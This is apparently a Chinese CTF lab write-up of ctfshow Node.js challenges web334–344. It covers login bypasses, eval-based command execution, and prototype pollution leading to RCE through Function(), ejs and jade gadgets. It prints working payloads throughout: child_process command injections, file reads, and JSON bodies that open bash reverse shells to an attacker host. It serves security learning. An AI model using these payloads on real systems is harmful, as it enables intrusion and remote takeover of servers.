---
title: Web入门_nodejs
author: Creexile
date: 2024-10-23 11:47:10
lastMod: 2025-04-10
summary: 'web334-344'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [代码审计, RCE, 原型链污染, CTF]
---

# nodejs

---

web334-344

先看这个: [NodeJS从零开始到原型链污染](https://www.anquanke.com/post/id/236182), 记得回来

## web334

- 描述: 开始nodejs

重命名为1.zip, 解压得到`login.js`和`user.js`, 在`user.js`中可以得到账密`CTFSHOW : 123456`

`login.js`中却限定我们传入的name不能等于CTFSHOW, name的大写形式要强等于item.username, 也就是CTFSHOW

```js
var findUser = function (name, password) {
  return users.find(function (item) {
    return name !== 'CTFSHOW' && item.username === name.toUpperCase() && item.password === password
  })
}
```

那就小写一些字母即可登录`CTFshow : 123456`

[P神\_Fuzz中的javascript大小写特性](https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html)

## web335

- 描述: 开始nodejs

查看源码, 发现提示`/?eval=`

那就是命令执行了, js中不像php, 有自己的规范: [eval()-javascript](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/eval); 本题可以用子进程执行命令: [子进程 | Node.js API文档](https://nodejs.cn/api/child_process.html#child-process)

下面是各式各样能执行ls命令的方法, 改一下命令即可获得flag

```
?eval=require("child_process").execSync('ls')

?eval=require('child_process').execSync('ls').toString()

?eval=require("child_process")['exe'%2B'cSync']('ls')

?eval=require('child_process').spawnSync( 'ls', [ './' ] ).stdout.toString()
```

还有

```
?eval=global.process.mainModule.constructor._load('child_process').execSync('ls')

# 这个函数可以读取文件和文件夹
?eval=require('fs').readdirSync(".")
?eval=require('fs').readFileSync('./fl00g.txt','utf8');

//字符串拼接
?eval=var s='global.process.mainModule.constructor._lo';var b="ad('child_process').ex";var c="ec(%27ls>public/1.txt%27);";eval(s%2Bb%2Bc)%3B
```

poc其中之一:

```
/?eval=require("child_process").execSync('tac fl00g.txt')
```

## web336

- 描述: 同上

执行文件操作可以获取源码, 明显过滤了exec和load

```
# 获取当前执行文件的绝对路径
?eval=__filename
?eval=require("fs").readFileSync('/app/routes/index.js','utf-8')
```

payload

```
?eval=require( 'child_process' ).spawnSync( 'ls', [ '.' ] ).stdout.toString()
?eval=require( 'child_process' ).spawnSync( 'cat', [ 'f*' ] ).stdout.toString()
# 同上题
?eval=require("fs").readdirSync('.','utf-8')
?eval=require("fs").readFileSync('./fl001g.txt','utf-8')
```

## web337

- 描述: 为本题源码

```js
var express = require('express')
var router = express.Router()
var crypto = require('crypto')

function md5(s) {
  return crypto.createHash('md5').update(s).digest('hex')
}

/* GET home page. */
router.get('/', function (req, res, next) {
  res.type('html')
  var flag = 'xxxxxxx'
  var a = req.query.a
  var b = req.query.b
  if (a && b && a.length === b.length && a !== b && md5(a + flag) === md5(b + flag)) {
    res.end(flag)
  } else {
    res.render('index', { msg: 'tql' })
  }
})

module.exports = router
```

主要是`md5(a+flag) === md5(b+flag)`的绕过,

> js变量分为值类型(基本类型),引用数据类型(对象类型)

`a[x]=1&b[x]=2` 相当于a和b都是引用数据类型(对象类型), 那么在`a+flag`和`b+flag` 时, 他们的结果就会都是`[object Object]flag{xxx}` , 那么md5值就是一样的

运行以下代码, 均会打印出`[object Object]flag{xxx}`

```js
//a,b是对象
a = { x: '1' }
b = { x: '2' }
console.log(a + 'flag{xxx}')
console.log(b + 'flag{xxx}')
```

如果传`a[0]=1&b[0]=2`, 此时相当于创了个数组变量`a=[1], b=[2]`, 此时输出结果为`1flag{xxx}`和`2flag{xxx}`

```js
//数组变量
a = [1]
b = [2]
console.log(a + 'flag{xxx}')
console.log(b + 'flag{xxx}')
```

所以payload:

```
GET:
/?a[x]=1&b[x]=2
```

## web338

- 描述: 源码都给你

`/routes/login.js`是关键文件, 本题主要是原型链污染, 你可能需要一点资料先理解一下原型链污染

```js
//# 只取关键代码
var secert = {}
let user = {}
utils.copy(user, req.body)
if (secert.ctfshow === '36dboy') {
  res.end(flag)
} else {
  return res.json({ ret_code: 2, ret_msg: '登录失败' + JSON.stringify(user) })
}
```

然后在`/utils/common.js`中找到了copy函数

```js
function copy(object1, object2) {
  for (let key in object2) {
    if (key in object2 && key in object1) {
      copy(object1[key], object2[key])
    } else {
      object1[key] = object2[key]
    }
  }
}
```

`utils.copy()`是一个简单的对象属性拷贝方法, 没有安全地处理对象合并, 存在原型链污染; 我们可以利用特殊的属性名指向对象的原型并对其进行修改

`secert`和`user`都是对象, 它们都基于`Object.prototype`, 所以通过`user`进行原型链污染`Object.prototype`的话, 所有基于`Object.prototype`的对象都会受到污染

```js
{
    "__proto__":{
    	"ctfshow":"36dboy"
    }
}
```

将其整合, 然后发包

```js
{
    "username":"admin",
    "password":"pass",
    "__proto__":{
        "ctfshow":"36dboy"
    }
}
```

![image-20241012191708343](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241012191708343.png)

## web339

- 描述: 源码都给你

```js
var flag = 'flag_here'
var secert = {}
var sess = req.session
let user = {}
utils.copy(user, req.body)
if (secert.ctfshow === flag) {
  res.end(flag)
} else {
  return res.json({ ret_code: 2, ret_msg: '登录失败' + JSON.stringify(user) })
}
```

代码基本不变, 尝试像上一题一样利用:

```js
{
    "username":"admin",
    "password":"pass",
    "__proto__":{
        "ctfshow":"flag_here"
    }
}
```

返回了`/views/api.html`的内容, 并不能获取flag; 显然能污染但是这里操作不了东西, 找找其他的地方

`api.html`的内容如下, 这个`<%= query%>`,可以在`/routes/api.js`中找到对应的定义

```js
<!DOCTYPE HTML>
<html>
<head>
<meta charset="utf-8">
<title>CTFshow 新手入门题目 </title>
</head>
<body>
	<%= query%>
</body>
</html>
```

相比于上一题, 在`/routes/api.js`中有以下代码, 我们往query中构造payload即会在这段模板渲染的代码中实现RCE，因为query在函数体内执行了

```js
/* GET home page.  */
router.post('/', require('body-parser').json(), function (req, res, next) {
  res.type('html')
  //# 没错就是下面这行
  res.render('api', { query: Function(query)(query) })
})
module.exports = router
```

现在先了解一下不同对象所生成的原型链, 其实不管也行, 因为所有变量的最顶层都是object

> 没有某个键值对的时候，它会直接去寻找Object对象的属性当中这个键值对是否存在, 也就是直接在最顶层修改, 所有继承它的都会受到影响

```js
var o = { a: 1 }
//# o对象直接继承了Object.prototype
//# o -> Object.prototype

var a = ['yo', 'whadup', '?']
//# 数组都继承于 Array.prototype
//# a -> Array.prototype -> Object.prototype

function f() {
  return 2
}
//# 函数都继承于 Function.prototype
//# f -> Function.prototype -> Object.prototype
```

所以我们可以直接通过原型链污染query的值, 就给它塞一个反弹shell

```js
{
    "__proto__":{
        "query":"return global.process.mainModule.constructor._load('child_process').execSync('bash -c \"bash -i >& /dev/tcp/ip/10000 0>&1\"')"
    }
}
//# 或
{
    "__proto__":{
        "query":"return global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i >&/dev/tcp/ip/10000 0>&1\"')"
    }
}
```

直接`require('child_process')`不行, 直接`bash -i`反弹shell也不行

> Function环境下没有require函数, 不过我们可以通过使用`process.mainModule.constructor._load`来代替require

先向`/login`发包污染query，再到`/api`下发相同的请求触发反弹shell

我这个因为之前测试, 所以返回的是`/api.html`,可能会有不同

![image-20241012202313402](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241012202313402.png)

然后你就直接将`/login`改成`/api`再发包, 此时就连上了; 最后flag在`./routes/login.js`中

![image-20241012202721907](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241012202721907.png)

## web340

- 描述: 源码都给你

看起来很么都没变, 发现上一题的payload用不了, 原因是`user`变了

结合上一题的不同对象所生成的原型链, 我们只需要增加一层`__proto__`即可, 其他步骤大差不差

```js
var user = new (function () {
  this.userinfo = new (function () {
    //# 上一题此处为 let user = {}; , 为对象, 更改后为函数
    //# ...
  })()
})()
utils.copy(user.userinfo, req.body)
if (user.userinfo.isAdmin) {
  res.end(flag)
} else {
  return res.json({ ret_code: 2, ret_msg: '登录失败' })
}
```

测试代码如下:

```js
function copy(object1, object2) {
  for (let key in object2) {
    if (key in object2 && key in object1) {
      copy(object1[key], object2[key])
    } else {
      object1[key] = object2[key]
    }
  }
}
var user = new (function () {
  this.userinfo = new (function () {
    this.isVIP = false
    this.isAdmin = false
    this.isAuthor = false
  })()
})()
//body=JSON.parse('{"__proto__":{"query":"123"}}');
body = JSON.parse('{"__proto__":{"__proto__":{"query":"123"}}}')
copy(user.userinfo, body)
console.log(user.__proto__)
console.log(user.__proto__.__proto__)
console.log(user.userinfo.__proto__)
console.log(user.userinfo.__proto__.__proto__)
```

payload:

```js
{
    "__proto__":{
        "__proto__":{
            "query":"return global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i >& /dev/tcp/ip/10000 0>&1\"')"
        }
    }
}
```

## web341

- 描述: 同上

开启了ejs渲染, 利用ejs打原型链(在`package.json`可以找到ejs和其对应的版本号)

> 还有特征就是在`app.js`中调用`res.render` 来渲染 ejs 模板

[ejs模板注入&js原型链污染（[GKCTF 2021]easynode）](https://zhuanlan.zhihu.com/p/690718215)

简而言之, 原本在ejs模板中是空的; 但是一旦有了值，ejs模板就会将outputFunctionName当作函数执行

```js
{
    "username":"a",
    "password":"a",
    "__proto__":{
        "__proto__":{
            "outputFunctionName":"a; return global.process.mainModule.constructor._load('child_process').execSync('bash -c \"bash -i >& /dev/tcp/vps/port 0>&1\"'); //"
        }
    }
}
```

## web342-web343

- 描述: 同上

jade原型链污染参考: [再探 JavaScript 原型链污染到 RCE](https://xz.aliyun.com/t/7025?time__1311=n4%2BxnD0Dy7itGQ%3D47KDsA3rZDBYa3D9QrlGrYD)

同样开启了ejs, 也是原型链污染; 注意是用POST在`/login`路由发包

```json
{
    "__proto__":{
        "__proto__":{
            "compileDebug":1,
            "type":"Code",
            "self":1,
            "line":"global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/ip/10000>&1\"')"
        }
    }
}

{
    "__proto__":{
        "__proto__":{
            "compileDebug":1,
            "type":"Code",
            "self":1,
            "line":"global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/ip/10000 0>&1\"')"
        }
    }
}
```

## web344

- 描述: 是一段代码

```js
router.get('/', function (req, res, next) {
  res.type('html')
  var flag = 'flag_here'
  if (req.url.match(/8c|2c|\,/gi)) {
    res.end('where is flag :)')
  }
  var query = JSON.parse(req.query.query)
  if (query.name === 'admin' && query.password === 'ctfshow' && query.isVIP === true) {
    res.end(flag)
  } else {
    res.end('where is flag. :)')
  }
})
```

过滤了8c和2c, 大概就是%8c(逗号), 似乎%2c也是逗号, 那就换成`&`就好了; payload如下

```
?query={"name":"admin"&query="password":"ctfshow"&query="isVIP":true}
```

url编码后传值即可
